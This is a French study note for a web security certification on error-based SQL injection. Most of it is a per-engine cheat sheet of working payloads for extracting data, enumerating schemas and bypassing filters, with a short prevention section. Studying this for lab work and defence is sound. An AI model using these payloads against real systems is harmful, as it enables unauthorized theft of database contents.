---
tags:
  - bscp
  - server-side
  - sql-injection
niveau: practitioner
statut: en cours
---
# Error-based SQL Injection

## En bref
- L'Error-based SQL injection (Error-based SQLi) regroupe les cas où les messages d'erreur de la base permettent de déduire ou de lire des données, même quand le résultat de la requête n'est pas affiché.
- Deux familles :
	- **Verbose errors :** le texte de l'erreur cite la donnée demandée (conversion de type, XPath, parsing XML). L'application doit afficher le message.
	- **Conditional errors :** l'erreur ne se produit que si une condition injectée est vraie. Il suffit d'une différence observable (code 500, message générique, page vide). La logique est celle des réponses conditionnelles de [[Blind-SQL-injection]] (Blind SQL injection).
- Une erreur de syntaxe sert à détecter l'injection. Une erreur d'exécution (division par zéro, conversion de type) sert à extraire ou à déduire.
- Les principes généraux (contexte d'injection, commentaires, encodage, UNION attack) sont dans [[SQL-injection]] et [[SQL-injection-Union-Attacks]].

## Choisir la famille et la forme

**Famille**
- Le message d'erreur SQL est affiché et cite des valeurs : verbose errors. La preuve n'est faite que si la valeur apparaît littéralement dans le message.
- Seul le code HTTP, la taille ou un message générique change : conditional errors.
- Rien ne change : passer aux délais puis à l'out-of-band (OAST), voir [[Blind-SQL-injection]].

**Forme de l'injection**
- Forme `AND` : `' AND 1=<expression>-- -`. `AND` exige un booléen, d'où le `1=` devant une conversion (PostgreSQL, SQL Server).
- Forme par concaténation : `'||(<expression>)||'` (Oracle, PostgreSQL, SQLite) ou `'+(<expression>)+'` (SQL Server). Pas de commentaire final, et la requête d'origine continue de s'exécuter avec sa valeur. C'est la forme la plus sûre dans une valeur de cookie.
- Contexte numérique : retirer l'apostrophe initiale (`1 AND 1=<expression>`).
- Contexte `ORDER BY` : placer l'expression dans une sous-requête, par exemple `ORDER BY (SELECT CASE WHEN <COND> THEN 1/(SELECT 0) ELSE 1 END)`.

**Où lire l'erreur**
- Corps de la réponse, commentaire HTML, champ JSON, header, ou page générique dont seul le code HTTP varie.
- Lire la réponse brute dans Burp Suite (Repeater), pas le rendu : les caractères `<` et `&` d'une valeur peuvent casser l'affichage.

## Comment détecter

**Démarche**
1. Envoyer une apostrophe seule, puis deux apostrophes. Une erreur avec une apostrophe qui disparaît avec deux montre que l'apostrophe est interprétée par le SQL.
2. Envoyer une concaténation neutre : `'||(SELECT '')||'`. Réponse normale si l'injection est dans une chaîne.
3. Si `(SELECT '')` échoue et que `(SELECT '' FROM dual)` passe, la cible est probablement Oracle (tout `SELECT` exige une table).
4. Envoyer une sous-requête sur une table inexistante : l'erreur n'apparaît que si le serveur exécute du SQL.
5. Pour une preuve de concept, faire citer une valeur inoffensive (version, utilisateur courant) avant de viser un mot de passe.
6. Confirmer que l'erreur dépend de la condition : envoyer la paire condition vraie et condition fausse (`1=1` et `1=2`) au moins trois fois. Un pare-feu applicatif peut répondre 403 sur le payload lui-même et pas sur la condition : comparer avec un payload neutre de même forme.

**Reconnaître le moteur dans un message d'erreur**

| Indice dans le message | Moteur probable |
|---|---|
| `You have an error in your SQL syntax ... near`, `XPATH syntax error: '...'` | MySQL ou MariaDB |
| `ERROR: invalid input syntax for type integer: "..."`, `argument of AND must be type boolean`, `syntax error at or near` | PostgreSQL |
| `ORA-01722`, `ORA-31011`, `ORA-29257`, `ORA-00923 FROM keyword not found`, `ORA-00933`, `ORA-00907` | Oracle |
| `Conversion failed when converting the nvarchar value '...' to data type int`, `Unclosed quotation mark after the character string`, `Incorrect syntax near` | Microsoft SQL Server |
| `SQLITE_ERROR`, `unrecognized token`, `near "...": syntax error` | SQLite |

**Sonde PostgreSQL**
- Payload : `' AND CAST((SELECT 1) AS int)-- -`
- Signal : `argument of AND must be type boolean, not type integer`.
- Limite : confirme PostgreSQL et le besoin du `1=`, sans citer de donnée.

## Conventions des payloads
- Placeholders : `<COLONNE>`, `<TABLE>`, `<UTILISATEUR>`, `<N>` (rang de la ligne ou position du caractère), `<POS>` (position de début d'une tranche), `<COND>` (condition booléenne).
- Contexte par défaut : chaîne entre apostrophes dans une clause `WHERE`, par exemple un cookie.
- Les payloads en forme `AND` se terminent par `-- -` (le tiret final évite de perdre l'espace au copier-coller). MySQL exige l'espace après `--` ; `#` est l'alternative.
- Dans un cookie ou une URL, encoder l'espace, le point-virgule (`%3B`) et le signe plus (`%2b`). Voir [[SQL-injection]] pour les commentaires et l'encodage.
- Lecture seule, une ligne à la fois. Pour une preuve de concept, un caractère ou le nom de l'utilisateur de la base suffit.

## Prérequis par moteur

| Technique | Version ou droit requis |
|---|---|
| `EXTRACTVALUE`, `UPDATEXML` (MySQL) | MySQL 5.1.5 et suivants, MariaDB |
| `GTID_SUBSET` | MySQL 5.6 et suivants, absent de MariaDB |
| `EXP(~(...))` | MySQL 5.5.5 et suivants, surtout la série 5, non adapté à MariaDB |
| `FLOOR(RAND())` | table source d'au moins trois lignes, comportement de `RAND` variable selon la version |
| `XMLTYPE` (Oracle) | composant XDB (présent par défaut) |
| `UTL_INADDR` | droit `EXECUTE` pour le compte applicatif ; les listes de contrôle d'accès réseau des versions récentes renvoient `ORA-24247` |
| `CTXSYS.DRITHSX.SN` | Oracle Text, droit `EXECUTE`, surtout les anciennes versions |
| `OFFSET ... FETCH` (Oracle) | 12c et suivantes |
| `STRING_AGG` (SQL Server) | 2017 et suivantes |
| `OFFSET ... FETCH` (SQL Server) | 2012 et suivantes, `ORDER BY` obligatoire |
| fonctions JSON (SQLite) | intégrées sur les versions récentes, extension JSON1 sur les anciennes |

## Verbose errors

**Principe.** Le moteur essaie de convertir une chaîne en un type incompatible (entier, XML, XPath) et recopie dans le message l'entrée qu'il n'a pas pu convertir. La donnée lue par la sous-requête apparaît donc dans l'erreur.

Si l'application recopie aussi la requête complète, le message révèle le contexte d'injection. Exemple de message du pilote JDBC de PostgreSQL :
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
Il montre ici une chaîne entre apostrophes dans un `WHERE`, ce qui guide la construction d'un payload valide.

En `INSERT` ou `UPDATE`, MySQL en mode strict affiche `Incorrect integer value: '<valeur>' for column ...`, ce qui cite la donnée. Attention aux données modifiées : rester en `SELECT` dès que possible.

### PostgreSQL

**Conversion en entier avec `CAST`**
- Payload : `' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `ERROR: invalid input syntax for type integer: "<valeur>"`.
- Limite : une seule ligne ; pas d'erreur si la valeur est un nombre ou `NULL` (voir la garde de préfixe) ; message parfois tronqué.

**Opérateur `::`**
- Payload : `' AND 1=(SELECT <COLONNE> FROM <TABLE> LIMIT 1)::int-- -`
- Contexte : identique ; utile si `CAST` est filtré ou pour raccourcir le payload.
- Signal et limite : identiques.

**Garde de préfixe pour valeurs numériques**
- Payload : `' AND 1=CAST(CHR(126)||(SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -`
- Contexte : la donnée peut être un nombre en texte (identifiant, code).
- Signal : `invalid input syntax for type integer: "~<valeur>"`.
- Limite : une valeur `NULL` donne `NULL` sans erreur ; utiliser `COALESCE((SELECT ...),'')`. `CHR(126)` évite aussi l'apostrophe.

**Ligne de rang N**
- Payload : `' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> ORDER BY 1 LIMIT 1 OFFSET <N>) AS int)-- -`
- Contexte : plusieurs lignes à parcourir ; `<N>` commence à 0.
- Signal : même message, une ligne par requête.
- Limite : sans `ORDER BY`, l'ordre n'est pas garanti.

**Agrégation de lignes**
- Payload : `' AND 1=CAST((SELECT string_agg(<COLONNE>,',') FROM <TABLE>) AS int)-- -`
- Contexte : lire toutes les lignes en une requête.
- Signal : liste complète entre guillemets.
- Limite : message souvent tronqué ; préférer la ligne de rang N si la liste est longue.

**Énumération du schéma**
- Payload tables : `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET <N>) AS int)-- -`
- Payload colonnes : `' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE>' LIMIT 1 OFFSET <N>) AS int)-- -`
- Contexte : noms inconnus.
- Signal : nom cité dans le message.
- Limite : droits de lecture sur `information_schema` ; le schéma `public` est le cas courant, sinon retirer le filtre.

**Version, utilisateur, base courante**
- Payload : `' AND 1=CAST(version() AS int)-- -` ; remplacer par `current_user` ou `current_database()`.
- Contexte : preuve de concept sans lire de données applicatives.
- Signal : `invalid input syntax for type integer: "PostgreSQL ..."`.
- Limite : l'utilisateur courant est une donnée sensible, mais sa lecture suffit comme preuve.

### MySQL et MariaDB

Le préfixe `0x7e` (caractère `~`) force l'erreur XPath et évite l'apostrophe. Une conversion de type classique ne cite pas la valeur en `SELECT` : on passe par des fonctions XML ou d'autres fonctions qui citent leur argument.

**`EXTRACTVALUE`**
- Payload : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)))-- -`
- Contexte : MySQL 5.1.5 et suivants, MariaDB.
- Signal : `XPATH syntax error: '~<valeur>'`.
- Limite : 32 caractères affichés, préfixe compris, donc tranches de 31 (voir Contraintes d'extraction).

**`UPDATEXML`**
- Payload : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)),1)-- -`
- Contexte : équivalent de `EXTRACTVALUE` si celui-ci est filtré.
- Signal et limite : identiques.

**Double requête avec `FLOOR(RAND())`**
- Payload : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -`
- Contexte : ancienne technique, en secours si les fonctions XML sont indisponibles.
- Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`.
- Limite : le nom de la clé varie selon la version (ne pas chercher une chaîne exacte) ; la table source doit avoir au moins trois lignes (`information_schema.tables` convient).

**`GTID_SUBSET`**
- Payload : `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1),0x7e),1)-- -`
- Contexte : MySQL 5.6 et suivants ; utile quand `EXTRACTVALUE` et `UPDATEXML` sont filtrés ou trop courts.
- Signal : `Malformed GTID set specification '~<valeur>~'`.
- Limite : absent de MariaDB ; message plus long que celui de `EXTRACTVALUE`.

**`EXP(~(...))`**
- Payload : `' AND EXP(~(SELECT * FROM (SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1) x))-- -`
- Contexte : MySQL 5.5.5 et suivants, surtout la série 5 ; en secours.
- Signal : `DOUBLE value is out of range in 'exp(~((select ... )))'` avec la valeur dans le texte.
- Limite : une colonne et une ligne ; non adapté à MariaDB.

**Version, utilisateur, base courante**
- Payload : `' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -` ; remplacer par `USER()` ou `DATABASE()`.
- Contexte : preuve de concept.
- Signal : `XPATH syntax error: '~<valeur>'`.
- Limite : 32 caractères ; `@@version` tient dans la fenêtre.

**Énumération du schéma et ligne de rang N**
- Payload tables : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <N>,1)))-- -`
- Payload colonnes : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=0x<NOM_EN_HEXADECIMAL> LIMIT <N>,1)))-- -`
- Contexte : schéma inconnu ; le nom de table en hexadécimal évite l'apostrophe.
- Signal : nom cité après `~`.
- Limite : droits sur `information_schema` ; `LIMIT <N>,1` est la syntaxe MySQL de décalage.

**Agrégation tranchée**
- Payload : `' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(<COLONNE>) FROM <TABLE>),<POS>,31)))-- -`
- Contexte : lire plusieurs lignes malgré la limite de 32 caractères.
- Signal : tranche de 31 caractères.
- Limite : `GROUP_CONCAT` est borné par `group_concat_max_len` (1024 par défaut).

### Oracle

Tout `SELECT` sans table exige `FROM dual`. `CHR(60)||CHR(58)` produit `<:`, un nom XML invalide. Les expressions de `<SOUS_REQUETE>` ci-dessous s'insèrent dans les deux formes `XMLTYPE`.

**`XMLTYPE`, forme `AND`**
- Payload : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' AND ROWNUM=1)||CHR(62))) FROM dual)-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `ORA-31011: XML parsing failed`, avec la valeur dans le détail (ligne `LPX-00110: Warning: invalid QName`).
- Limite : une seule ligne ; composant XDB requis ; les caractères spéciaux de la valeur sont interprétés comme du XML.

**`XMLTYPE`, forme par concaténation**
- Payload : `'||(SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual)||'`
- Contexte : valeur de cookie, sans commentaire final.
- Signal et limite : identiques à la forme `AND`.

**`UTL_INADDR.GET_HOST_NAME`**
- Payload : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -`
- Contexte : Oracle sans filtre sur le paquetage.
- Signal : `ORA-29257: host <valeur> unknown`.
- Limite : les listes de contrôle d'accès réseau des versions récentes renvoient `ORA-24247` ; droit d'exécution requis pour le compte applicatif.

**`CTXSYS.DRITHSX.SN`**
- Payload : `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -`
- Contexte : Oracle avec Oracle Text installé.
- Signal : `ORA-20000: Oracle Text error` avec la valeur (erreur `DRG-11701`).
- Limite : surtout les anciennes versions ; droit `EXECUTE` requis.

**Ligne de rang N**
- Payload avec `ROWNUM` : `(SELECT <COLONNE> FROM (SELECT <COLONNE>, ROWNUM r FROM <TABLE>) WHERE r=<N>)` à la place de la sous-requête des formes `XMLTYPE`.
- Payload 12c : `(SELECT <COLONNE> FROM <TABLE> OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY)`
- Contexte : `ROWNUM=1` seul ne permet pas de passer à la deuxième ligne.
- Signal : même message que `XMLTYPE`.
- Limite : `FETCH` demande Oracle 12c ou plus ; `<N>` commence à 1 pour `ROWNUM`, à 0 pour `OFFSET`.

**Agrégation avec `LISTAGG`**
- Payload : `(SELECT LISTAGG(<COLONNE>,',') WITHIN GROUP (ORDER BY <COLONNE>) FROM <TABLE>)` dans les formes `XMLTYPE`.
- Contexte : lire toutes les lignes d'un coup.
- Signal : liste entière dans le message.
- Limite : chaîne limitée à 4000 octets (`ORA-01489` au-delà) ; message tronqué.

**Version, base et schéma**
- Payload version : `(SELECT banner FROM v$version WHERE ROWNUM=1)`
- Payload tables : `(SELECT table_name FROM all_tables WHERE ROWNUM=1)`
- Payload colonnes : `(SELECT column_name FROM all_tab_columns WHERE table_name='<TABLE_EN_MAJUSCULES>' AND ROWNUM=1)`
- Contexte : à insérer dans les formes `XMLTYPE`.
- Signal : valeur citée dans le message.
- Limite : noms d'objets en majuscules ; droit de lecture sur `v$version` ; pour les rangs suivants, combiner avec la ligne de rang N.

### Microsoft SQL Server

`TOP 1` remplace `LIMIT 1`.

**`CONVERT` en entier**
- Payload : `' AND 1=CONVERT(int,(SELECT TOP 1 <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'))-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int.` (`varchar` si la colonne est de ce type).
- Limite : une seule ligne ; pas d'erreur si la valeur est un nombre en texte.

**`CAST` en entier**
- Payload : `' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- -`
- Contexte : équivalent de `CONVERT`.
- Signal et limite : identiques.

**Version, utilisateur, base courante**
- Payload : `' AND 1=CONVERT(int,@@version)-- -` ; remplacer par `SYSTEM_USER`, `USER_NAME()`, `DB_NAME()` ou `@@servername`.
- Contexte : preuve de concept.
- Signal : message de conversion avec la valeur.

**Agrégation de lignes**
- Payload 2017 et suivants : `' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -`
- Payload plus ancien : `' AND 1=CONVERT(int,CONVERT(varchar(max),(SELECT name+',' FROM sys.tables FOR XML PATH(''))))-- -`
- Contexte : lire plusieurs lignes en une requête.
- Signal : liste dans le message.
- Limite : `FOR XML PATH` renvoie le type `xml`, dont la conversion directe en entier est refusée sans citer la valeur ; la conversion intermédiaire en `varchar(max)` est indispensable. Les caractères spéciaux sont échappés en entités XML (`&amp;`). Message tronqué.

**Ligne de rang N et schéma**
- Payload avec `NOT IN` : `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN (SELECT TOP <N> name FROM sys.tables)))-- -`
- Payload 2012 et suivants : `' AND 1=CONVERT(int,(SELECT name FROM sys.tables ORDER BY 1 OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY))-- -`
- Payload colonnes : `' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='<TABLE>' AND column_name NOT IN ('<COL1>','<COL2>')))-- -` où la liste exclut les colonnes déjà lues.
- Contexte : énumérer les objets un par un.
- Signal : nom cité dans le message.
- Limite : `OFFSET ... FETCH` exige un `ORDER BY`.

**Garde de préfixe pour valeurs numériques**
- Payload : `' AND 1=CONVERT(int,'~'+(SELECT TOP 1 <COLONNE> FROM <TABLE>))-- -`
- Contexte : donnée qui ressemble à un nombre.
- Signal : message de conversion avec `~<valeur>`.
- Limite : une valeur `NULL` donne `NULL` ; utiliser `ISNULL`. Le signe plus s'envoie sous la forme `%2b` dans une URL ou un cookie.

**Erreurs de regroupement**
- Payload : `' HAVING 1=1-- -` puis `' GROUP BY <COLONNE> HAVING 1=1-- -`
- Contexte : anciennes versions, requête d'origine qui liste des colonnes.
- Signal : `Column '<table>.<colonne>' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause`, une colonne par requête.
- Limite : ne lit que la structure de la requête d'origine ; technique d'appoint.

### SQLite

Aucune verbose error sur les données : `CAST` ne lève pas d'erreur (renvoie 0) et il n'y a pas de fonction XML. Si l'application affiche les erreurs brutes, `no such table: <nom>` et `no such column: <nom>` confirment ou infirment des noms d'objets, sans lire de valeur. Pour SQLite, passer aux conditional errors.

## Contraintes d'extraction

**Une ligne à la fois**
- Une sous-requête qui renvoie plusieurs lignes déclenche `more than one row`, `ORA-01427` ou `Subquery returns more than 1 row` avant la conversion, et masque la valeur.
- Limiter à une ligne : `LIMIT 1` (PostgreSQL, MySQL), `ROWNUM=1` (Oracle), `TOP 1` (SQL Server).
- Ligne de rang N : voir les payloads par moteur (`OFFSET`, `LIMIT <N>,1`, `ROWNUM` imbriqué, `NOT IN`). Avec Burp Intruder, un jeu de payloads numérique pour `<N>` et l'option Grep - Extract pour récupérer la valeur dans le message.

**Plusieurs lignes en une requête**
- Agrégats : `string_agg` (PostgreSQL), `GROUP_CONCAT` (MySQL, limité par `group_concat_max_len`), `LISTAGG` (Oracle, 4000 octets), `STRING_AGG` (SQL Server 2017 et suivants).
- Contrepartie : la troncature du message revient aussitôt.

**Message tronqué**
- Causes : limite de la fonction (XPATH MySQL, 32 caractères dont le préfixe `~`, soit 31 caractères utiles), troncature par l'application, taille d'un champ d'affichage, longueur de la valeur elle-même.
- Si l'application recopie la requête complète dans le message, le payload occupe lui-même la place : raccourcir le payload (retirer les espaces superflus, alias courts, `::int` plutôt que `CAST(... AS int)`) et supprimer la valeur d'origine du paramètre.
- Extraire par tranches de 31 caractères : `SUBSTRING(<expression>,<POS>,31)` (MySQL, PostgreSQL, SQL Server) ou `SUBSTR` (Oracle). Position de départ = 1 + 31 x (rang de la tranche - 1), soit 1, 32, 63, 94...
- Connaître la longueur avant de découper : `CAST(CHR(126)||LENGTH(<expression>) AS int)` sur PostgreSQL cite la longueur dans le message.
- Sur MySQL, `GTID_SUBSET` donne un message plus long quand `EXTRACTVALUE` est trop court.

**Valeur du cookie à vider**
- Pourquoi : la valeur d'origine (par exemple un identifiant de suivi de 16 à 20 caractères) fait partie de la requête et, selon l'application, du message ou du texte tronqué. La vider libère de la place.
- Contrepartie : une valeur vide ne correspond à aucune ligne. Avec la forme `AND`, l'expression peut alors ne pas être évaluée. Si l'erreur disparaît après avoir vidé la valeur, revenir à une valeur existante et raccourcir le payload, ou passer à la forme par concaténation.
- Ne vider que le cookie injecté, laisser le cookie de session intact.

**Valeurs numériques, NULL, caractères spéciaux**
- Une chaîne qui ressemble à un nombre se convertit en entier sans erreur (PostgreSQL, SQL Server) : préfixer par un caractère non numérique (`CHR(126)||` ou `'~'+`).
- Une valeur `NULL` ne produit pas d'erreur : utiliser `COALESCE` ou `ISNULL`.
- Caractères spéciaux : encoder avant d'afficher (`HEX()` MySQL, `RAWTOHEX` Oracle, `encode(...,'hex')` PostgreSQL), sinon les entités XML ou les caractères non imprimables rendent la valeur illisible.

## Conditional errors

**Principe.** `CASE WHEN (<COND>) THEN <expression qui échoue> ELSE <valeur du même type> END`. L'erreur ne survient que si la condition est vraie. Les deux branches doivent avoir le même type, sinon la conversion de la branche `ELSE` peut elle-même échouer. Exemple SQL Server correct :
`xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 1 END FROM users)=1-- -`

**Extraction**
- Vérifier d'abord que la ligne cible existe : un `WHERE username='x'` sans ligne renvoie zéro ligne, donc aucune erreur, ce qui se confond avec une condition fausse.
- Longueur : `LENGTH(<COLONNE>)><N>` (`LEN` sur SQL Server).
- Caractère : `SUBSTR`/`SUBSTRING(<COLONNE>,<POS>,1)='<c>'`.
- Recherche dichotomique : `ASCII(...)><N>` (`unicode(...)` sur SQLite). Détails dans [[Blind-SQL-injection]].
- `1/0` n'est pas universel : voir les payloads par moteur.

**Automatisation**
- Burp Intruder (voir [[Blind-SQL-injection]]). L'oracle est le statut HTTP 500 contre 200, lisible dans la colonne Status ; sinon Grep - Match sur le début du message d'erreur (`invalid input syntax`, `XPATH syntax error`).

### PostgreSQL

**Division par zéro**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/(SELECT 0) ELSE 1 END)-- -`
- Signal : `ERROR: division by zero` si la condition est vraie (HTTP 500 ou page d'erreur), page normale sinon.
- Limite : `1/0` seul est évalué à l'avance par l'optimiseur et lève l'erreur dans tous les cas ; `(SELECT 0)` l'évite.

**Conversion qui échoue**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN CAST((SELECT 'a') AS int) ELSE 1 END)-- -`
- Contexte : alternative quand la division est filtrée.
- Signal : `invalid input syntax for type integer: "a"` si la condition est vraie.
- Limite : `CAST('a' AS int)` sans sous-requête échoue toujours (évaluation à l'avance).

**Sous-requête multi-lignes**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)-- -`
- Contexte : alternative sans division ni conversion.
- Signal : `more than one row returned by a subquery used as an expression` si vrai.

**Forme par concaténation**
- Payload : `'||(SELECT CASE WHEN (<COND>) THEN CAST(1/(SELECT 0) AS text) ELSE '' END)||'`
- Contexte : valeur lue par la requête d'origine, pas de commentaire à placer.
- Signal : `division by zero` si vrai.

### MySQL et MariaDB

`1/0` renvoie `NULL` en lecture sur MySQL : il ne déclenche pas d'erreur. On provoque l'erreur avec une sous-requête qui renvoie plusieurs lignes.

**`IF` avec sous-requête multi-lignes**
- Payload : `' AND IF(<COND>,(SELECT table_name FROM information_schema.tables),'a')-- -`
- Signal : `Subquery returns more than 1 row` si vrai, page normale sinon.
- Limite : la table doit avoir au moins deux lignes. C'est la forme de [[Blind-SQL-injection]].

**`CASE` avec `UNION`**
- Payload : `' AND (SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- -`
- Contexte : alternative sans table de référence.
- Signal : `Subquery returns more than 1 row` si vrai.

### Oracle

**Division par zéro convertie en chaîne**
- Payload : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- Contexte : valeur de cookie, forme par concaténation.
- Signal : `ORA-01476: divisor is equal to zero` (HTTP 500 ou page d'erreur) si vrai, page normale sinon.
- Limite : `TO_CHAR` garde un type cohérent entre les branches ; `FROM dual` obligatoire. Pour lire une table, remplacer `FROM dual` par `FROM <TABLE> WHERE username='<UTILISATEUR>'` (la ligne doit exister).

**Forme `AND`**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END FROM dual)-- -`
- Contexte : paramètre où la concaténation est impossible, ou contexte numérique (retirer l'apostrophe initiale).
- Signal : `ORA-01476` si vrai.

**`TO_NUMBER` qui échoue**
- Payload : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR(TO_NUMBER('a')) ELSE '' END FROM dual)||'`
- Contexte : alternative quand la division est filtrée.
- Signal : `ORA-01722: invalid number` si vrai.
- Limite : ce message ne cite jamais la valeur ; il ne sert que d'oracle de type conditional error.

**Sous-requête multi-lignes**
- Payload : `'||(SELECT CASE WHEN (<COND>) THEN TO_CHAR((SELECT 1 FROM dual UNION ALL SELECT 2 FROM dual)) ELSE '' END FROM dual)||'`
- Contexte : alternative sans division.
- Signal : `ORA-01427: single-row subquery returns more than one row` si vrai.

### Microsoft SQL Server

**Division par zéro**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END)-- -`
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : les deux branches doivent être de type entier. Mettre `'a'` dans la branche `ELSE` fait échouer la requête même quand la condition est fausse, car `CASE` prend le type de plus haute priorité (`int`).

**Stacked queries**
- Payload : `'; IF (<COND>) SELECT 1/0-- -`
- Contexte : interface qui accepte plusieurs instructions.
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : dans un cookie, le point-virgule s'encode `%3B` ; l'instruction empilée peut modifier des données, la réserver à des fonctions inoffensives.

**Conversion qui échoue**
- Payload : `' AND 1=(SELECT CASE WHEN (<COND>) THEN CONVERT(int,'a') ELSE 1 END)-- -`
- Contexte : alternative quand la division est filtrée.
- Signal : `Conversion failed when converting the varchar value 'a' to data type int.` si vrai.
- Limite : l'apostrophe est nécessaire ; sinon utiliser `CHAR(97)`.

**Forme par concaténation**
- Payload : `'+(SELECT CASE WHEN (<COND>) THEN CAST(1/0 AS varchar) ELSE '' END)+'`
- Contexte : valeur de cookie, sans commentaire final.
- Signal : `Divide by zero error encountered.` si vrai.
- Limite : le signe plus s'envoie sous la forme `%2b`.

### SQLite

La forme par concaténation avec `||` s'applique aussi.

**Dépassement d'entier**
- Payload : `' AND (SELECT CASE WHEN (<COND>) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -`
- Signal : `integer overflow` si vrai.
- Limite : `abs` du plus petit entier signé ; comportement stable sur les versions courantes.

**JSON mal formé**
- Payload : `' AND (SELECT CASE WHEN (<COND>) THEN json('{') ELSE 1 END)=1-- -`
- Contexte : alternative si le dépassement d'entier est filtré.
- Signal : `malformed JSON` si vrai.
- Limite : fonctions JSON requises (extension JSON1 sur les anciennes versions).

## Filter bypass
Limité à ce qui est propre aux erreurs. Le filter bypass général est dans [[SQL-injection]].

| Filtre | Alternative |
|---|---|
| fonction de conversion | `CAST` remplacé par `::int` (PostgreSQL) ou `CONVERT` (SQL Server) |
| fonction XML | `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET`, `EXP(~(...))` sur MySQL |
| apostrophe | `0x7e` (MySQL), `CHR(126)` (PostgreSQL, Oracle), `CHAR(126)` (SQL Server), `$$texte$$` (PostgreSQL) |
| division | `CAST`, `TO_NUMBER` ou `CONVERT` pour les conditional errors |
| `SUBSTRING` | `MID`, `SUBSTR`, `LEFT` et `RIGHT`, ou un test par motif (`LIKE '<préfixe>%'`) qui évite toute extraction de sous-chaîne |
| `=` | `LIKE`, `IN`, `BETWEEN`, `>` et `<` |
| `AND` | `&&` (MySQL), ou forme par concaténation |
| `LIMIT` | `OFFSET`, `FETCH`, `TOP`, ou un filtre sur une clé |
| espaces | `/**/`, `%0a`, parenthèses autour des sous-requêtes |
| commentaire final | `#` (MySQL), ou apostrophe finale qui rééquilibre la requête |

## Pièges et points d'attention BSCP
- Repérer le moteur avant de choisir la fonction : cela fait gagner du temps.
- Ligne non lue : une erreur dans une sous-requête n'a lieu que si l'expression est évaluée. Si la valeur d'origine ne correspond à aucune ligne, utiliser la forme par concaténation ou garder une valeur qui existe.
- Utilisateur inexistant dans une conditional error : aucune erreur, quelle que soit la condition. Confirmer l'existence de l'utilisateur d'abord.
- `1/0` n'est pas universel : `NULL` sur MySQL, évalué à l'avance sur PostgreSQL, `TO_CHAR` et `FROM dual` sur Oracle.
- Cookie : ne pas casser le cookie de session ; encoder espace, point-virgule et signe plus.
- Lire la réponse brute, et confirmer que la valeur citée est bien celle demandée avant de conclure.
- Pour sqlmap, suivre la règle de [[Blind-SQL-injection]].

## Prévention
- Requêtes paramétrées pour toutes les valeurs, allowlist pour les noms de colonnes ou de tables dynamiques. Voir [[SQL-injection]] et [[Blind-SQL-injection]].
- Messages d'erreur génériques en production, avec journalisation côté serveur : désactiver `display_errors` (PHP) et activer `customErrors` (ASP.NET).
- Retirer les droits `EXECUTE` accordés à `PUBLIC` sur `UTL_INADDR` et les paquetages `CTXSYS`.
- Réponses uniformes (même code, même taille) pour que 500 et 200 ne servent pas d'oracle.
- Masquer l'erreur ne ferme pas la faille : l'injection reste exploitable en Blind SQLi.
- Un pare-feu applicatif n'est pas une correction. La journalisation doit alerter sur les rafales d'erreurs 500.

## Labs PortSwigger
- [ ] Apprentice
- [ ] Practitioner ✅ 2026-11-02 (Blind SQL injection avec erreurs conditionnelles)

